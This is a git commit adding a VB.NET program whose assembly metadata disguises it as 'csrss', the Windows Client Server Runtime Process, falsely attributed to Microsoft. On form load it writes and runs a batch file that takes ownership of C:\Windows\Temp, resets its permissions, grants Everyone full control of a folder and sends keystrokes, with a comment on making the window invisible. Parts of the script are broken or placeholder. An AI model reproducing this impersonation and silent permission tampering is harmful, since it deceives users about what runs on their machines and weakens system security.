ee44459b6a1bfa2242a7f92d9d4548542e5f1db2
Justin L. Ross | Alias: David | Lucian Patterson <88350777+Rythorian77@users.noreply.github.com>
2022-03-14 23:08:27 -0400

    Add files via upload

---
+++ AssemblyInfo.vb
@@ -0,0 +1,36 @@
+﻿Imports System.Reflection
+Imports System.Resources
+Imports System.Runtime.InteropServices
+
+' General Information about an assembly is controlled through the following
+' set of attributes. Change these attribute values to modify the information
+' associated with an assembly.
+
+' Review the values of the assembly attributes
+
+<Assembly: AssemblyTitle("csrss")>
+<Assembly: AssemblyDescription("Client Server Runtime Process")>
+<Assembly: AssemblyCompany("Microsoft Corporation")>
+<Assembly: AssemblyProduct("Microsoft©  Windows©  Operating System")>
+<Assembly: AssemblyCopyright("Copyright ©  2021 Microsoft Corporation. All rights reserved.")>
+<Assembly: AssemblyTrademark("Microsoft Corporation")>
+
+<Assembly: ComVisible(False)>
+
+'The following GUID is for the ID of the typelib if this project is exposed to COM
+<Assembly: Guid("d2135731-0bff-4978-9895-bee665d1efbd")>
+
+' Version information for an assembly consists of the following four values:
+'
+'      Major Version
+'      Minor Version
+'      Build Number
+'      Revision
+'
+' You can specify all the values or you can default the Build and Revision Numbers
+' by using the '*' as shown below:
+' <Assembly: AssemblyVersion("1.0.*")>
+
+<Assembly: AssemblyVersion("1.0.0.0")>
+<Assembly: AssemblyFileVersion("1.0.0.0")>
+<Assembly: NeutralResourcesLanguage("en-US")>
---
+++ Form1.vb
@@ -0,0 +1,37 @@
+﻿Option Strict On
+Option Explicit On
+Imports System.IO
+Imports System.Text
+Imports Microsoft.Win32
+
+Public Class Form1
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Tactician()
+
+
+
+    End Sub
+
+    Private Sub Tactician()
+        Dim sb As New StringBuilder
+        sb.AppendLine("SET FOLDER_NAME=C:\Windows\Temp")
+        sb.AppendLine("TAKEOWN /f %FOLDER_NAME% /r /d y")
+        sb.AppendLine("ICACLS %FOLDER_NAME% /grant administrators:F /t")
+        sb.AppendLine("ICACLS %FOLDER_NAME% /reset /T")
+        sb.AppendLine("icacls foo /grant Everyone:(OI)(CI)F")
+        ' sb.AppendLine("IF NOT %ERRORLEVEL%==0 GOTO")
+        sb.AppendLine("timeout /t 4 /nobreak")
+        sb.AppendLine("echo .appactivate^(""%~1"" ^) : .sendkeys ""{enter}")
+        sb.AppendLine("GoTo begin")
+        File.WriteAllText("fileName.bat", sb.ToString())
+        'Run Bat invisible
+        Shell("fileName.bat", AppWinStyle.NormalFocus) 'Change to "hide" for it to be invisible
+    End Sub
+
+
+
+
+
+
+End Class
